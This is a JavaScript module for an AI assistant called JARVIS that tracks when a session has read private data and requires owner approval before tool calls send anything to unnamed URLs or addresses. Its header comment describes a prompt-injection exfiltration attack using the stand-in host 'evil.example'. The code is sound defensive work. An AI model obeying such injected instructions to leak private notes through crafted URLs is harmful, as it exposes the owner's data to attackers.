/**
 * Taint tracking and URL exfiltration (plan 08, phase 2, second half).
 *
 * The attack this stops: a page, an email or a file says "open
 * https://evil.example/?q=" and the model, having just read your notes, appends
 * them. Labelling content as untrusted (untrusted.mjs) asks the model not to
 * do that; this module makes the bridge refuse to let it happen silently.
 *
 * Two rules, both enforced in code rather than in the prompt:
 *
 *   1. Taint. Once a session has read private content — a local file, saved
 *      memories, the user's own browser, mail, the camera, any server we cannot
 *      vouch for — every outbound action (open a URL, fetch, send, type into a
 *      page, run a shell) needs the owner's approval, unless each target is one
 *      the owner named, or a URL that arrived verbatim in external content (a
 *      search result, a fetched page). A URL copied unchanged carries nothing
 *      the model added; a URL the model built is where data gets smuggled out.
 *      Recipients of messages (email addresses) must always be named by the
 *      owner: an address that only appears in content is exactly the attacker's.
 *
 *   2. The media proxy. /img and /media only fetch URLs that appeared in an
 *      external tool result, in the owner's own words, or in a page the bridge
 *      rendered. Panel HTML is authored by the model, so an <img src> in it is
 *      otherwise a beacon that fires the moment it is drawn — no tool call, no
 *      gate, nothing to approve.
 *
 * Taint is per session and sticky: private text stays in the model's context
 * after the turn that read it, so clearing the flag at the next turn would only
 * clear our memory of the risk, not the risk. An approved target is remembered
 * for the rest of the session so the owner is asked once, not every time.
 *
 * No dependencies, like tool-gate.mjs, so taint.test.mjs can drive it directly.
 */

// ---------------------------------------------------------------------------
// Extracting targets

const URL_RE = /\bhttps?:\/\/[^\s<>"'`{}|\\^]+/gi
const EMAIL_RE = /\b[A-Z0-9._%+-]+@(?:[A-Z0-9-]+\.)+[A-Z]{2,24}\b/gi
/** A bare host such as `bbc.co.uk`, not part of a path, an address or a longer URL. */
const HOST_RE = /(?<![\w@/\\.-])((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,24})(?![\w-]|\.\w)/gi
/** Argument names whose whole value is a URL even when it has no scheme. */
const URL_KEYS = /^(url|uri|href|link|links|urls|endpoint|domain|host|site|website|webhook|callback|src|images)$/i
const IS_EMAIL = /^[A-Z0-9._%+-]+@(?:[A-Z0-9-]+\.)+[A-Z]{2,24}$/i

const TRAILING = /[).,;:!?'"\]>*]+$/

/** Undo the escaping that hides a URL from a regex: HTML entities and JSON slashes. */
function unescapeText(text) {
  return String(text)
    .replace(/&amp;/gi, '&')
    .replace(/&#x?0*26;/gi, '&')
    .replace(/&quot;/gi, '"')
    .replace(/\\\//g, '/')
}

/**
 * A URL in the one spelling we compare: parsed, fragment dropped, host lower
 * case. Returns null for anything that is not http(s).
 */
export function normaliseUrl(raw) {
  let text = String(raw ?? '').trim().replace(TRAILING, '')
  if (!text) return null
  if (!/^[a-z][a-z0-9+.-]*:/i.test(text)) {
    if (text.startsWith('//')) text = `https:${text}`
    else if (/^[a-z0-9.-]+\.[a-z]{2,24}(?:[:/?#]|$)/i.test(text)) text = `https://${text}`
  }
  try {
    const url = new URL(text)
    if (url.protocol !== 'http:' && url.protocol !== 'https:') return null
    url.hash = ''
    return url.href
  } catch {
    return null
  }
}

/** Host of a URL without a leading `www.`, or null. */
export function hostOf(url) {
  try {
    return new URL(url).hostname.toLowerCase().replace(/^www\./, '').replace(/\.$/, '')
  } catch {
    return null
  }
}

/** Every http(s) URL in a piece of text, normalised. */
export function extractUrls(text) {
  const out = new Set()
  for (const m of unescapeText(text).matchAll(URL_RE)) {
    const url = normaliseUrl(m[0])
    if (url) out.add(url)
  }
  return [...out]
}

/** Every email address in a piece of text, lower case. */
export function extractEmails(text) {
  return [...new Set([...String(text ?? '').matchAll(EMAIL_RE)].map((m) => m[0].toLowerCase()))]
}

/**
 * Spoken text arrives as "bbc dot co dot uk" as often as "bbc.co.uk", and an
 * address as "jo at example dot com". Folding those back is what lets the
 * owner name a site out loud.
 */
export function unspeak(text) {
  return foldDots(text).replace(/(\w)\s+at\s+(?=[a-z0-9-]+\.[a-z]{2,})/gi, '$1@')
}

/** Only the "dot" half, for hosts: "meet at bbc dot com" names a site, not an address. */
const foldDots = (text) => String(text ?? '').replace(/\s+dot\s+(?=[a-z0-9])/gi, '.')

/** Hosts the text names, from full URLs and bare domains alike. */
export function extractHosts(text) {
  const spoken = foldDots(text)
  const hosts = new Set()
  for (const url of extractUrls(spoken)) {
    const host = hostOf(url)
    if (host) hosts.add(host)
  }
  // Bare domains, with addresses taken out first so `jo@example.com` does not
  // also name example.com as a site to open.
  const withoutEmails = unescapeText(spoken).replace(EMAIL_RE, ' ').replace(URL_RE, ' ')
  for (const m of withoutEmails.matchAll(HOST_RE)) {
    hosts.add(m[1].toLowerCase().replace(/^www\./, ''))
  }
  return [...hosts]
}

/** Every string inside a tool input, with the key it sat under. */
function* strings(value, key = '', depth = 0) {
  if (depth > 8 || value == null) return
  if (typeof value === 'string') {
    yield [key, value]
    return
  }
  if (Array.isArray(value)) {
    for (const item of value) yield* strings(item, key, depth + 1)
    return
  }
  if (typeof value === 'object') {
    for (const [k, v] of Object.entries(value)) yield* strings(v, k, depth + 1)
  }
}

/** All text in a tool result, however the SDK shaped it. */
export function textOf(value) {
  return [...strings(value)].map(([, s]) => s).join('\n')
}

/**
 * What a tool call would reach: URLs and email addresses in its arguments.
 *
 * A value under a URL-ish key counts even without a scheme (`example.com/x`),
 * because a browser will happily open it. Anything that parses to some other
 * scheme there (`javascript:`, `file:`) is reported as `unknown`, which can
 * never be pre-approved by naming.
 */
export function targetsOf(input) {
  const urls = new Set()
  const emails = new Set()
  let unknown = false
  for (const [key, value] of strings(input)) {
    for (const url of extractUrls(value)) urls.add(url)
    for (const email of extractEmails(value)) emails.add(email)
    if (URL_KEYS.test(key)) {
      const trimmed = value.trim()
      if (!trimmed || /^(back|forward|reload)$/i.test(trimmed)) continue
      if (/^mailto:/i.test(trimmed)) continue
      const url = normaliseUrl(trimmed)
      if (url) urls.add(url)
      else if (!IS_EMAIL.test(trimmed)) unknown = true
    }
  }
  return { urls: [...urls], emails: [...emails], unknown }
}

// ---------------------------------------------------------------------------
// Classifying tools

const mcpParts = (name) => {
  const m = /^mcp__(.+?)__(.+)$/.exec(String(name))
  return m ? { server: m[1], tool: m[2] } : null
}

/**
 * Servers whose results are public content rather than the owner's data:
 * web search, registries, and asking another model a question. Reading them
 * does not taint. Everything not listed — including any server added later —
 * counts as private, so a stale list errs toward asking.
 */
export const PUBLIC_MCP = new Set([
  'exa', 'exa-code', 'serper', 'serpapi', 'lottie-search', 'mcp-registry',
  'openrouter', 'openrouter-image',
])

/** Built-ins whose results are public, or only the agent's own bookkeeping. */
const PUBLIC_BUILTINS = new Set([
  'WebSearch', 'WebFetch', 'ToolSearch', 'TodoWrite',
  'Write', 'Edit', 'MultiEdit', 'NotebookEdit', 'KillShell', 'TaskStop',
])

/** JARVIS servers that only draw on our own screen, or launch a fixed app list. */
const PUBLIC_OWN_SERVERS = new Set(['jarvis', 'jarvis_ui', 'jarvis_apps', 'jarvis_task'])

/** Does reading this tool's result put private content in the session? */
export function readsPrivate(toolName) {
  const name = String(toolName ?? '')
  if (!name) return true
  const mcp = mcpParts(name)
  if (!mcp) return !PUBLIC_BUILTINS.has(name)
  if (PUBLIC_OWN_SERVERS.has(mcp.server)) return false
  if (mcp.server === 'jarvis_chrome' && mcp.tool === 'chrome_status') return false
  return !PUBLIC_MCP.has(mcp.server)
}

/**
 * Tools whose results are external content the model did not write, so a URL
 * in them is one the model can copy without having built it. The local stores
 * the model can write to (memory, workspace, task reports, shell output) are
 * left out on purpose: writing a URL there and reading it back must not turn a
 * constructed URL into a "seen" one.
 */
export function resultIsExternal(toolName) {
  const name = String(toolName ?? '')
  if (name === 'WebFetch' || name === 'WebSearch') return true
  const mcp = mcpParts(name)
  if (!mcp) return false
  if (mcp.server === 'jarvis_chrome') return true
  if (mcp.server === 'jarvis') return mcp.tool === 'probe_url'
  return !mcp.server.startsWith('jarvis')
}

/**
 * Local: no data leaves the machine through these, whatever their arguments.
 * Workspace writes, shell commands and pushes, deletions and workflow changes
 * already show the owner an approval card of their own; the HUD only draws
 * (its images are policed by the media proxy instead); memory is local.
 */
const LOCAL_BUILTINS = new Set([
  'Read', 'Glob', 'Grep', 'TodoWrite', 'ToolSearch', 'WebSearch',
  'Write', 'Edit', 'MultiEdit', 'NotebookEdit', 'KillShell', 'TaskStop',
  'BashOutput', 'TaskOutput', 'ListMcpResources', 'ListMcpResourcesTool',
  'ReadMcpResource', 'ReadMcpResourceTool',
])
const LOCAL_SERVERS = new Set([
  'jarvis_ui', 'jarvis_memory', 'jarvis_workspace', 'jarvis_development',
  'jarvis_workflows', 'jarvis_eyes', 'jarvis_apps', 'jarvis_task',
])

/** Browser tools that move data into a page, or move the browser somewhere. */
const CHROME_OUTBOUND = new Set(['chrome_navigate', 'chrome_type', 'chrome_form_input'])

/**
 * How a tool call leaves the machine, if it does.
 *
 *   'none'   — local; never asks.
 *   'scan'   — only outbound if its arguments contain a URL or an address.
 *   'always' — outbound whatever its arguments; with no target we can check,
 *              a tainted session must ask.
 *
 * `isEffectful(server, tool)` is the gate's own veto (tool-gate.mjs isVetoed):
 * a third-party tool that sends, posts or creates is outbound even when it
 * names no target we can read.
 */
export function outboundKind(toolName, input, { isEffectful = () => false } = {}) {
  const name = String(toolName ?? '')
  const mcp = mcpParts(name)
  if (!mcp) {
    if (LOCAL_BUILTINS.has(name)) return 'none'
    if (name === 'WebFetch' || name === 'Bash') return 'always'
    return 'scan'
  }
  if (LOCAL_SERVERS.has(mcp.server)) return 'none'
  if (mcp.server === 'jarvis') {
    if (mcp.tool === 'probe_url') return 'always'
    // A blade with a url frames that page through the bridge; a gallery or
    // markup blade only draws images, which the media proxy decides.
    if (mcp.tool === 'blade') return input && typeof input === 'object' && String(input.url ?? '').trim() ? 'always' : 'none'
    return 'none'
  }
  if (mcp.server === 'jarvis_chrome') {
    if (mcp.tool === 'chrome_navigate' && /^(back|forward|reload)$/i.test(String(input?.url ?? '').trim())) return 'none'
    return CHROME_OUTBOUND.has(mcp.tool) ? 'always' : 'none'
  }
  // A delegated task is briefed in text the model wrote; a link in that brief
  // is one the worker will treat as named, so it is checked here, on the way in.
  if (mcp.server === 'jarvis_tasks') return mcp.tool === 'spawn_task' ? 'scan' : 'none'
  if (mcp.server.startsWith('jarvis')) return 'scan'
  return isEffectful(mcp.server, mcp.tool) ? 'always' : 'scan'
}

// ---------------------------------------------------------------------------
// URLs seen in external content

/**
 * A bounded, expiring set of URLs that arrived in external content. One per
 * bridge, because /img and /media are plain HTTP endpoints that know nothing
 * of sessions.
 */
export function createSeenUrls({ max = 5000, ttlMs = 6 * 60 * 60 * 1000, now = Date.now } = {}) {
  const seen = new Map()
  const prune = () => {
    const cutoff = now() - ttlMs
    for (const [url, at] of seen) {
      if (at >= cutoff && seen.size <= max) break
      seen.delete(url)
    }
  }
  const add = (url) => {
    const key = normaliseUrl(url)
    if (!key) return
    seen.delete(key)
    seen.set(key, now())
  }
  return {
    add,
    /** Remember every URL in this text. */
    noteText(text) {
      for (const url of extractUrls(text)) add(url)
      prune()
    },
    has(url) {
      const key = normaliseUrl(url)
      if (!key) return false
      const at = seen.get(key)
      if (at === undefined) return false
      if (at < now() - ttlMs) {
        seen.delete(key)
        return false
      }
      return true
    },
    get size() {
      return seen.size
    },
  }
}

/**
 * The image URLs a rendered reading view points at, so the proxy will serve
 * them. They were chosen by the page the owner opened, not by the model.
 */
export function proxiedMediaIn(html) {
  const out = []
  for (const m of String(html ?? '').matchAll(/\/(?:img|media)\?url=([^"'&\s>]+)/g)) {
    try {
      out.push(decodeURIComponent(m[1]))
    } catch {
      // A malformed escape is simply not added.
    }
  }
  return out
}

// ---------------------------------------------------------------------------
// The per-session tracker

/**
 * One per agent session.
 *
 *   seen         — the bridge's createSeenUrls().
 *   isEffectful  — tool-gate.mjs isVetoed, so a send/post/create counts.
 *   tainted      — start tainted (a background worker, whose brief was
 *                  written by a model that may have read private content).
 */
export function createTaintTracker({ seen = createSeenUrls(), isEffectful = () => false, tainted = false } = {}) {
  let taint = tainted ? { source: 'the task brief' } : null
  const namedHosts = new Set()
  const namedEmails = new Set()
  const approvedHosts = new Set()
  const approvedEmails = new Set()

  const hostNamed = (host, set) => {
    for (const named of set) {
      if (host === named || host.endsWith(`.${named}`)) return true
    }
    return false
  }

  const tracker = {
    /** The owner's own words for a turn — never memory context or a preface. */
    noteOwnerText(text) {
      for (const host of extractHosts(text)) namedHosts.add(host)
      for (const email of extractEmails(unspeak(text))) namedEmails.add(email)
      seen.noteText(text)
    },

    /** Private content entered the session some other way (restored memories). */
    markPrivate(source) {
      if (!taint) taint = { source: String(source || 'private content') }
    },

    /** A tool result came back. */
    noteResult(toolName, response) {
      if (resultIsExternal(toolName)) seen.noteText(textOf(response))
      if (readsPrivate(toolName)) tracker.markPrivate(String(toolName).replace(/^mcp__/, '').replace(/__/g, ' › '))
    },

    get tainted() {
      return taint !== null
    },
    get taintSource() {
      return taint?.source ?? null
    },

    /**
     * Decide an outbound call. Returns { action: 'allow' } or
     * { action: 'ask', targets, reason } — the caller shows the approval.
     */
    check(toolName, input) {
      const kind = outboundKind(toolName, input, { isEffectful })
      if (kind === 'none') return { action: 'allow' }
      const { urls, emails, unknown } = targetsOf(input)
      if (kind === 'scan' && !urls.length && !emails.length && !unknown) return { action: 'allow' }
      if (!taint) return { action: 'allow' }

      const unvetted = []
      for (const url of urls) {
        const host = hostOf(url)
        if (host && (hostNamed(host, namedHosts) || hostNamed(host, approvedHosts))) continue
        if (seen.has(url)) continue
        unvetted.push(url)
      }
      for (const email of emails) {
        if (namedEmails.has(email) || approvedEmails.has(email)) continue
        unvetted.push(email)
      }
      const blind = unknown || (kind === 'always' && !urls.length && !emails.length)
      if (!unvetted.length && !blind) return { action: 'allow' }
      return {
        action: 'ask',
        targets: blind && !unvetted.length ? ['a destination JARVIS cannot check'] : unvetted,
        reason: `This session has read private content (${taint.source}).`,
      }
    },

    /** The owner approved these targets: don't ask about them again this session. */
    approve(targets) {
      for (const t of targets ?? []) {
        if (t.includes('@') && !t.includes('/')) approvedEmails.add(t.toLowerCase())
        else {
          const host = hostOf(t)
          if (host) approvedHosts.add(host)
        }
      }
    },
  }
  return tracker
}

/** Short tool label for an approval card. */
const label = (toolName) => String(toolName).replace(/^mcp__/, '').replace(/__/g, ' › ')

/**
 * The PreToolUse step, shared by the voice session and background workers.
 * Resolves to null when the call may proceed, or to a deny reason.
 *
 *   approve(title, details) → Promise<boolean>, an approval card.
 */
export async function guardOutbound(tracker, approve, toolName, input) {
  const verdict = tracker.check(toolName, input)
  if (verdict.action === 'allow') return null
  const ok = typeof approve === 'function'
    ? await approve(
      'Send outside this computer?',
      [
        verdict.reason,
        `Tool: ${label(toolName)}`,
        `Destination: ${verdict.targets.join(', ')}`,
        'You did not name this destination. It may have come from a page, email or file.',
      ].join('\n'),
    ).catch(() => false)
    : false
  console.log(`[jarvis] outbound ${label(toolName)} -> ${verdict.targets.join(', ')}: ${ok ? 'approved' : 'refused'}`)
  if (ok) {
    tracker.approve(verdict.targets)
    return null
  }
  return 'Not sent: this session has read private content and the owner did not approve sending to ' +
    'a destination they had not named. Tell the owner in one sentence; do not retry another way.'
}
